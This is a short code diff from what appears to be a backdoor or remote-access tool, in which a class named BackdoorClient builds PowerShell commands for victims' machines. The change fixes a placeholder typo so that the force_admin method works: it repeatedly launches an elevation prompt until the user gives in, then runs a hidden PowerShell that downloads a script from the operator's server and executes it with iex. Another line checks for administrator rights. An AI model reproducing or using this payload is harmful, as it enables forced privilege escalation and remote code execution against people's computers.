@@ -285,7 +285,7 @@ class BackdoorClient:
         return "$(new-object security.principal.windowsprincipal([security.principal.windowsidentity]::getcurrent())).isinrole([security.principal.windowsbuiltinrole]::administrator)"
 
     def force_admin(self):
-        return """while($true){try{start powershell -verb runas -arg "-wi h -command `"`$a=(new-object system.net.webclient).downloadString('http://HTTP_APPDR/SCRIPT_NAME'); iex `$a`"";break;}catch{echo ''}}""".replace("HTTP_ADDR", str(self.settings.http_server_address[1])).replace("SCRIPT_NAME", self.settings.script_name)
+        return """while($true){try{start powershell -verb runas -arg "-wi h -command `"`$a=(new-object system.net.webclient).downloadString('http://HTTP_ADDR/SCRIPT_NAME'); iex `$a`"";break;}catch{echo ''}}""".replace("HTTP_ADDR", str(self.settings.http_server_address[1])).replace("SCRIPT_NAME", self.settings.script_name)
         
     def format_data(self, data): 
         last_line = data.split("\n")[-1]
